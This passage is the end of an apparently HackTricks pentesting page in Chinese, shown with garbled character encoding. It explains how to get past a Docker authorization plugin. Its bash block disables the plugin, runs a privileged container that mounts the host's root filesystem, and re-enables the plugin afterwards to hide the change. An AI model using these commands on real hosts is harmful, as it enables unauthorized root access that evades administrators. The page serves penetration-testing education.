<strong><code>HostConfig</code></strong> é€šå¸¸æ˜¯åŒ…å« <strong>æœ‰è¶£</strong> <strong>æƒé™</strong> çš„å…³é”®ï¼Œå¯ä»¥é€ƒç¦»å®¹å™¨ã€‚ç„¶è€Œï¼Œæ­£å¦‚æˆ‘ä»¬ä¹‹å‰è®¨è®ºçš„ï¼Œæ³¨æ„åœ¨å¤–éƒ¨ä½¿ç”¨ Binds ä¹Ÿæœ‰æ•ˆï¼Œå¹¶ä¸”å¯èƒ½å…è®¸æ‚¨ç»•è¿‡é™åˆ¶ã€‚
{% endhint %}</p>
<h2 id="ç¦ç”¨æ’ä»¶"><a class="header" href="#ç¦ç”¨æ’ä»¶">ç¦ç”¨æ’ä»¶</a></h2>
<p>å¦‚æœ <strong>ç³»ç»Ÿç®¡ç†å‘˜</strong> <strong>å¿˜è®°</strong> <strong>ç¦æ­¢</strong> ç¦ç”¨ <strong>æ’ä»¶</strong> çš„èƒ½åŠ›ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹å®Œå…¨ç¦ç”¨å®ƒï¼</p>
<pre><code class="language-bash">docker plugin list #Enumerate plugins

# If you donâ€™t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
</code></pre>
<p>è®°å¾—åœ¨æå‡æƒé™å<strong>é‡æ–°å¯ç”¨æ’ä»¶</strong>ï¼Œå¦åˆ™<strong>dockeræœåŠ¡çš„é‡å¯å°†æ— æ•ˆ</strong>ï¼</p>
<h2 id="auth-plugin-bypass-æ–‡ç« "><a class="header" href="#auth-plugin-bypass-æ–‡ç« ">Auth Plugin Bypass æ–‡ç« </a></h2>
<ul>
<li><a href="https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/">https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/</a></li>
</ul>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../linux-hardening/privilege-escalation/docker-security/apparmor.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../linux-hardening/privilege-escalation/docker-security/cgroups.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../linux-hardening/privilege-escalation/docker-security/apparmor.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../linux-hardening/privilege-escalation/docker-security/cgroups.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
